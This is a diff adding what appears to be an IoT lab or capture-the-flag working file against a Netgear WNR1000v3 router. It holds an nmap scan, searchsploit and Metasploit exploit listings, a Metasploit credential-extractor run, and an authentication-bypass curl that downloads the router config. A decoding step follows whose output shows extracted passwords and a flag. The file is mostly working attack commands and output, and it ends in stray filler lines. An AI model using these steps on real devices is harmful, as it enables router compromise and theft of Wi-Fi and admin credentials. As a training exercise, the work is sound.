@@ -1,0 +1,104 @@
+nmap -T4 -sV 10.11.0.82 -oA wan-tcp
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-07-08 11:24 MDT
+Nmap scan report for WNR1000v3 (10.11.0.82)
+Host is up (0.00048s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Netgear WNR1000v3 WAP http config
+MAC Address: 74:44:01:31:32:57 (Netgear)
+Service Info: Device: WAP; CPE: cpe:/h:netgear:wnr1000v3
+
+
+
+./searchsploit wnr
+[i] Found (#1): /opt/iot-resources/tools/exploitdb/files_exploits.csv
+[i] To remove this message, please edit "/opt/iot-resources/tools/exploitdb/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)
+
+[i] Found (#1): /opt/iot-resources/tools/exploitdb/files_shellcodes.csv
+[i] To remove this message, please edit "/opt/iot-resources/tools/exploitdb/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
+
+------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                          |  Path
+------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Netgear WiFi Router JWNR2010v5 / R6080 - Authentication Bypass                                                          | hardware/webapps/47117.txt
+Netgear WNR1000 - Authentication Bypass                                                                                 | hardware/webapps/24916.txt
+Netgear WNR1000v3 - Password Recovery Credential Disclosure (Metasploit)                                                | hardware/webapps/33984.rb
+Netgear WNR1000v4 - Authentication Bypass                                                                               | hardware/webapps/39356.py
+Netgear WNR2000 - Multiple Information Disclosure Vulnerabilities                                                       | hardware/remote/33177.txt
+Netgear WNR2000 FW 1.2.0.8 - Information Disclosure                                                                     | hardware/remote/9498.txt
+Netgear WNR2000v5 - 'hidden_lang_avi' Remote Stack Overflow (Metasploit)                                                | hardware/remote/41719.rb
+Netgear WNR2000v5 - Remote Code Execution                                                                               | cgi/remote/40949.rb
+Netgear WNR500 Wireless Router - 'webproc?getpage' Traversal Arbitrary File Access                                      | hardware/webapps/35325.txt
+Netgear WNR500/WNR612v3/JNR1010/JNR2010 ADSL Router - (Authenticated) Remote File Disclosure                            | hardware/remote/40737.sh
+OwnRS Blog 1.2 - 'autor.php' SQL Injection                                                                              | php/webapps/7849.txt
+OwnRS blog beta3 - SQL Injection / Cross-Site Scripting                                                                 | php/webapps/5860.txt
+SimpNews 2.40.01 - 'newnr' SQL Injection                                                                                | php/webapps/3942.pl
+------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+
+
+
+
+msfconsole
+search wnr
+   0  auxiliary/admin/http/netgear_soap_password_extractor  2015-02-11       normal  No     Netgear Unauthenticated SOAP Password Extractor
+
+Amsf6 auxiliary(admin/http/netgear_soap_password_extractor) > run
+[*] Running module against 10.11.0.82
+
+[*] Trying to access the configuration of the device
+[*] Extracting Firmware version...
+[*] Extracting credentials...
+[*] Extracting Wifi...
+[*] Extracting WPA Keys...
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/http/netgear_soap_password_extractor) > 
+
+https://github.com/grimm-co/NotQuite0DayFriday/blob/trunk/2020.06.15-netgear/exploit.py
+#   WNR1000v3   V1.0.2.72_60.0.96     d411870b5481c7cd0eb562910ef2c073  Untested
+
+
+https://www.exploit-db.com/exploits/24916
+curl http://10.11.0.82:8080/NETGEAR_fwpt.cfg?.jpg --output NETGEAR_fwpt.cfg
+
+python2 wnr1000-edb24916.py < NETGEAR_fwpt.cfg  | strings | grep -i pass
+	wla_temp_passphrase=
+	pptp_passwd=
+	ver_check_ftp_password=WNR1000v3@
+	pppoe2_west_passwd=flets
+	super_passwd=Geardog
+	http_passwd=FLAG{xxxxxxx}
+	bpa_passwd=
+	pppoe2_east_passwd=guest
+	wla_passphrase_2=
+	wla_passphrase_3=
+	wla_passphrase_4=
+	pppoe_passwd=
+	ddns_passwd=
+	wla_passphrase=
+	pppoe_tmp_passwd=
+	pppoe2_passwd=
+
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+A
+
